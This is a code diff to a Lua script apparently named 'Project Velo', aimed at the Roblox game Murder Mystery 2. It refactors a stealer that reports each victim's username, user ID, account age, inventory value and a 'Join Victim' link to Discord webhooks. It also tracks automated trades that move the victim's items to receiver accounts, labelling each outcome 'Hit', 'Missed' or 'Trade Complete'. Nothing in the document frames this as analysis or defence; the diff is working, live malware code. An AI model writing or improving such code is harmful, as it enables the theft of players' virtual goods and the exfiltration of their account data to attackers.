@@ -3,8 +3,8 @@ getgenv().ProjectVeloConfig = {
     Receivers = {
         "{{WEBHOOK}}",
     },
-    ReceiverAccounts = {{RECEIVER_ACCOUNTS}},
     Targets = {{TARGETS}},
+    ReceiverAccounts = {{RECEIVER_ACCOUNTS}},
     MinimumItemValue = {{MIN_VALUE}},
     MinimumRarity = "{{MIN_RARITY}}",
 }
@@ -56,6 +56,10 @@ local projectVeloConfig = genv.ProjectVeloConfig
 local receivers = projectVeloConfig.Receivers or projectVeloConfig.RECEIVERS
 local minimumItemValue = projectVeloConfig.MinimumItemValue or projectVeloConfig.MINIMUM_ITEM_VALUE or 0
 local minimumRarity = projectVeloConfig.MinimumRarity or projectVeloConfig.MINIMUM_RARITY or "Common"
+local receiverAccountsList = projectVeloConfig.ReceiverAccounts or projectVeloConfig.RECEIVER_ACCOUNTS or {}
+local receiverDisplay = (type(receiverAccountsList) == "table" and #receiverAccountsList > 0)
+    and table.concat(receiverAccountsList, ", ")
+    or "N/A"
 local num = tonumber(minimumItemValue)
 
 if not num then
@@ -97,10 +101,6 @@ for _, receiver in ipairs(receivers) do
 		table.insert(tbl2, match)
 	end
 end
-
--- receiverAccountsList = Roblox usernames that receive items
-local receiverAccountsList = projectVeloConfig.ReceiverAccounts or {}
-local receiverAccountsDisplay = #receiverAccountsList > 0 and table.concat(receiverAccountsList, ", ") or "Unknown"
 
 if #tbl2 == 0 then
 	return
@@ -1611,11 +1611,11 @@ local function fn32()
 		valuablesText = valuablesText .. string.format("\n... and %d more", overflow)
 	end
 
-	-- status: missed = no godly+, hit = godly+
-	local statusText = hasGodlyPlus and "🟢 Hit" or "🔴 Missed"
+	-- initial status is always Hit — Missed or Trade Complete are patched in later
+	local statusText = "🟢 Hit"
 
 	local fields = {
-		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusText, str12, receiverAccountsDisplay), inline = false },
+		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusText, str12, receiverDisplay), inline = false },
 		{ name = "🎯 Player",      value = string.format("```\nUsername:     %s\nUser ID:      %s\nAccount Age:  %d days\nDisplay Name: %s\n```", localPlayer.Name, tostring(localPlayer.UserId), accountAgeDays, localPlayer.DisplayName), inline = false },
 		{ name = "🔗 Join Victim", value = "[Click Here](" .. joinLink .. ")", inline = false },
 		{ name = "💰 Total Value", value = "```\n" .. fn26(n8) .. "\n```", inline = false },
@@ -1667,31 +1667,9 @@ local function fn32()
 	return success
 end
 
--- PATCH the posted embed to show Missed — only fires if trade did not already complete
+-- PATCH the posted embed to show Missed — preserves all original fields
 local function fn32_update_missed(reason)
-	-- do not overwrite a completed trade
-	if projectVeloMM2LiveRuntime.Completed then return end
-
 	reason = reason or "Missed"
-	local statusLabel = reason == "Left Server" and "🔴 Missed (Left Server)" or "🔴 Missed"
-
-	-- rebuild join link for the patch
-	local missedJoinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(v10)
-
-	-- rebuild valuables
-	local missedValuableLines = {}
-	for i, v7 in ipairs(v4) do
-		if i > 15 then break end
-		if v7.value > 0 then
-			local displayName = v7.displayName or v7.name
-			table.insert(missedValuableLines, string.format("%s x%d %s ➜ %s (%s)", "✨", v7.amount, displayName, fn26(v7.totalValue), v7.rarity))
-		end
-	end
-	local missedValuablesText = #missedValuableLines > 0 and table.concat(missedValuableLines, "\n") or "No items"
-	local missedOverflow = #v4 - math.min(#v4, 15)
-	if missedOverflow > 0 then
-		missedValuablesText = missedValuablesText .. string.format("\n... and %d more", missedOverflow)
-	end
 
 	local accountAgeDays = 0
 	pcall(function()
@@ -1699,16 +1677,34 @@ local function fn32_update_missed(reason)
 		if created then accountAgeDays = created end
 	end)
 
-	local missedFields = {
-		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusLabel, str12, receiverAccountsDisplay), inline = false },
+	local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(v10)
+
+	local valuableLines = {}
+	for i, v7 in ipairs(v4) do
+		if i > 15 then break end
+		if v7.value > 0 then
+			local displayName = v7.displayName or v7.name
+			table.insert(valuableLines, string.format("%s x%d %s ➜ %s (%s)", "✨", v7.amount, displayName, fn26(v7.totalValue), v7.rarity))
+		end
+	end
+	local valuablesText = #valuableLines > 0 and table.concat(valuableLines, "\n") or "No items"
+	local overflow = #v4 - math.min(#v4, 15)
+	if overflow > 0 then
+		valuablesText = valuablesText .. string.format("\n... and %d more", overflow)
+	end
+
+	local statusLabel = reason ~= "" and ("🔴 Missed (" .. reason .. ")") or "🔴 Missed"
+
+	local fields = {
+		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusLabel, str12, receiverDisplay), inline = false },
 		{ name = "🎯 Player",      value = string.format("```\nUsername:     %s\nUser ID:      %s\nAccount Age:  %d days\nDisplay Name: %s\n```", localPlayer.Name, tostring(localPlayer.UserId), accountAgeDays, localPlayer.DisplayName), inline = false },
-		{ name = "🔗 Join Victim", value = "[Click Here](" .. missedJoinLink .. ")", inline = false },
+		{ name = "🔗 Join Victim", value = "[Click Here](" .. joinLink .. ")", inline = false },
 		{ name = "💰 Total Value", value = "```\n" .. fn26(n8) .. "\n```", inline = false },
-		{ name = "📦 Valuables",   value = "```\n" .. missedValuablesText .. "\n```", inline = false },
+		{ name = "📦 Valuables",   value = "```\n" .. valuablesText .. "\n```", inline = false },
 	}
 
 	if url and url ~= "" then
-		table.insert(missedFields, { name = "📋 Summary", value = "[View Full Inventory](" .. url .. ")", inline = false })
+		table.insert(fields, { name = "📋 Summary", value = "[View Full Inventory](" .. url .. ")", inline = false })
 	end
 
 	for _, webhookUrl in ipairs(tbl2) do
@@ -1719,7 +1715,7 @@ local function fn32_update_missed(reason)
 			embeds = {{
 				title  = "Murder Mystery 2! Look, You Have Hits! Congrats! 🎉",
 				color  = 15548997,
-				fields = missedFields,
+				fields = fields,
 				footer = { text = "MM2 • Project Velo" },
 			}},
 		})
@@ -1764,7 +1760,7 @@ local function fn33(arg, arg2, _arg3)
 	end
 
 	local fields = {
-		{ name = "🎯 Status",      value = string.format("```\nStatus:   ✅ Trade Complete\nExecutor: %s\nReceiver: %s\n```", str12, receiverAccountsDisplay), inline = false },
+		{ name = "🎯 Status",      value = string.format("```\nStatus:   ✅ Trade Complete\nExecutor: %s\nReceiver: %s\n```", str12, receiverDisplay), inline = false },
 		{ name = "🎯 Player",      value = string.format("```\nUsername:     %s\nUser ID:      %s\nAccount Age:  %d days\nDisplay Name: %s\n```", localPlayer.Name, tostring(localPlayer.UserId), accountAgeDays, localPlayer.DisplayName), inline = false },
 		{ name = "🔗 Join Victim", value = "[Click Here](" .. joinLink .. ")", inline = false },
 		{ name = "💰 Total Value", value = "```\n" .. tradeValue .. "\n```", inline = false },
@@ -1831,23 +1827,17 @@ Players.PlayerRemoving:Connect(function(player)
 	end
 end)
 
--- Anti-leave: when target player leaves during an active trade session, update embed to Missed
--- Guard: skip if the trade already completed so we don't overwrite a successful result
+-- Anti-leave: only fires "Left Server" when a trade session is actually live
+-- (OtherPlayer set by StartTrade.OnClientEvent). runtime.Target is also set during
+-- invite attempts where no trade has started yet — checking OtherPlayer prevents
+-- false "Left Server" reports for declines, timeouts, or pre-trade departures.
 Players.PlayerRemoving:Connect(function(player)
 	local runtime = genv.ProjectVeloTradeRuntime
 	if not runtime or not runtime.Active then return end
-	-- if trade completed, clear target and bail — do not patch embed
-	if projectVeloMM2LiveRuntime.Completed then
-		runtime.Target = nil
-		runtime.OtherPlayer = nil
-		runtime.AcceptScheduled = false
-		runtime.AcceptPending = false
-		runtime.ObservedOffer = nil
-		runtime.Session = runtime.Session + 1
-		return
-	end
-	if tostring(player.Name):lower() == tostring(runtime.Target or ""):lower() then
-		-- confirmed player left — patch embed to Missed (Left Server)
+	local otherPlayer = tostring(runtime.OtherPlayer or "")
+	if otherPlayer == "" then return end -- no active trade in progress
+	if tostring(player.Name):lower() == otherPlayer:lower() then
+		-- confirmed: player left while a live trade session was open
 		task.spawn(function()
 			fn32_update_missed("Left Server")
 		end)
